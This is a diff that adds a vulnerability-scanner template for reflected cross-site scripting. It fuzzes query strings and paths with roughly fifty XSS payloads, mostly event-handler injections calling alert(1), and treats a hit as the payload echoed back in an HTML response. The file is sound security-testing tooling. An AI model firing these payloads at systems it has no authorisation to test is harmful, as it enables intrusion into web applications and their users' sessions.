@@ -1,0 +1,94 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<col id=x tabindex=1 ondeactivate=alert(1)></col><input id=y autofocus>"
+        - "<svg><image onload=alert(1)"
+        - "<style>@keyframes slidein {}</style><kbd style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></kbd>"
+        - "<sub draggable=\"true\" ondragleave=\"alert(1)\">test</sub>"
+        - "<svg><input type=image onload=alert(1)></svg>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><table ondragover=alert(1) contenteditable>drop here</table>"
+        - "<plaintext draggable=\"true\" ondragstart=\"alert(1)\">test</plaintext>"
+        - "<tt id=x tabindex=1 onactivate=alert(1)></tt>"
+        - "<embed onbeforecut=\"alert(1)\" contenteditable>test</embed>"
+        - "<multicol onkeypress=\"alert(1)\" contenteditable>test</multicol>"
+        - "<output id=x tabindex=1 ondeactivate=alert(1)></output><input id=y autofocus>"
+        - "<details id=x tabindex=1 onbeforeactivate=alert(1)></details>"
+        - "<marquee draggable=\"true\" ondragleave=\"alert(1)\">test</marquee>"
+        - "<dl draggable=\"true\" ondragend=\"alert(1)\">test</dl>"
+        - "&lt;SCRIPT SRC&gt;//www[dot]somehackerwebsite.com//&lt;/SCRIPT&gt;"
+        - "<map id=x tabindex=1 ondeactivate=alert(1)></map><input id=y autofocus>"
+        - "<xmp draggable=\"true\" ondragend=\"alert(1)\">test</xmp>"
+        - "<frameset draggable=\"true\" ondragend=\"alert(1)\">test</frameset>"
+        - "<frameset draggable=\"true\" ondragstart=\"alert(1)\">test</frameset>"
+        - "<noframes onload=alert(1);"
+        - "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<plaintext onbeforecopy=\"alert(1)\" contenteditable>test</plaintext>"
+        - "<map id=x tabindex=1 onactivate=alert(1)></map><input autofocus>"
+        - "<plaintext onblur=alert(1) tabindex=1 id=x></plaintext><input autofocus>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext>"
+        - "<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>"
+        - "<del draggable=\"true\" ondragleave=\"alert(1)\">test</del>"
+        - "<marquee style=\"x:\\expression(javascript:alert(1)\";></marquee>"
+        - "<html><script>alert(1)</script></html>"
+        - "<output draggable=\"true\" ondragleave=\"alert(1)\">test</output>"
+        - "<svg><font onload=alert(1)></font>"
+        - "<embed oncopy=\"alert(1)\" contenteditable>test</embed>"
+        - "<plaintext id=x tabindex=1 ondeactivate=alert(1)></plaintext><input id=y autofocus>"
+        - "<img src=x onerror\\x21=javascript:alert(1)>"
+        - "<map onbeforecut=\"alert(1)\" contenteditable>test</map>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><pre ondrop=alert(1) contenteditable>drop here</pre>"
+        - "<svg><embed onload=alert(1)></embed>"
+        - "<dl draggable=\"true\" ondragstart=\"alert(1)\">test</dl>"
+        - "<map id=x tabindex=1 onbeforeactivate=alert(1)></map>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><dialog ondragover=alert(1) contenteditable>drop here</dialog>"
+        - "<svg/onload=\"alert(1)\"></svg>"
+        - "<img src\\x3d\\x27onerror=javascript:alert(1)>"
+        - "<menuitem onmouseover=\"alert(1)\">test</menuitem>"
+        - "<style>:target {color:red;}</style><tfoot id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></tfoot>"
+        - "<time onmouseleave=\"alert(1)\">test</time>"
+        - "<col onkeydown=\"alert(1)\" contenteditable>test</col>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><noscript ondrop=alert(1) contenteditable>drop here</noscript>"
+        - "<style>@keyframes slidein {}</style><pre style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></pre>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
